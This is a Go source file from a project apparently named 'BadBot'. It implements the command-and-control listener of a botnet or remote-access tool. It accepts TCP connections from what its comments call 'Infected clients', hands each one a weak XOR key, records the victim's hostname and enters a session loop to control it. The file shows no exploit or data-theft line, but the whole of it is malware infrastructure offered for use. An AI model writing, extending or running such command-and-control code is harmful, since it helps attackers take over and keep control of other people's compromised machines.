package slave

import (
	"fmt"
	"log"
	"math/rand"
	"net"
	"strings"
)

// handles incomming connections
func addSession(session net.Conn) {

	// Generate a xor key for the Client
	var Shell Client

	Shell.Xorkey = rand.Intn(32)
	Shell.Session = session

	// Write Xor Key
	session.Write([]byte{byte(Shell.Xorkey)})

	// Read Name Of Client

	buf := make([]byte, 32)

	n, err := session.Read(buf)

	if err != nil || n == 0 {
		return
	}

	// Close Connection once we hit the exit of this funcion
	defer Shell.Session.Close()

	// Xor Bytes to a readable string
	buf = xorbytes(buf, Shell.Xorkey)

	// Add HostName
	Shell.Name = strings.ToLower(string(buf[:n]))

	if _, exist := Clients[Shell.Name]; exist {
		return
	}
	mut.Lock()
	// sync our threads
	Clients[Shell.Name] = Shell

	mut.Unlock()

	fmt.Printf("[BadBot] Client [%s] connected] | Key: %d\n", Shell.Name, Shell.Xorkey)

	// Read Loop
	Shell.read()

	// error/exit handling | Once A return instruction is called exit function will start
	Shell.exit()
}

// Starts a Listener For The Slaves Connecected
func Init_Slave(port string) {

	// start listener with the net package
	n, err := net.Listen("tcp", ":"+port)

	if err != nil {
		log.Fatalln("[BadBot/init_Slave] error >> ", err.Error())
	}

	log.Println("[BadBot] Initiated Slave Listener To Port: ", n.Addr().String())

	// Accept Sessions And Handle the Infected clients

	for {

		session, err := n.Accept()

		if err != nil {
			log.Println("[BadBot/init_Slave] error >> ", err.Error())
			continue
		}

		go addSession(session)
	}
}
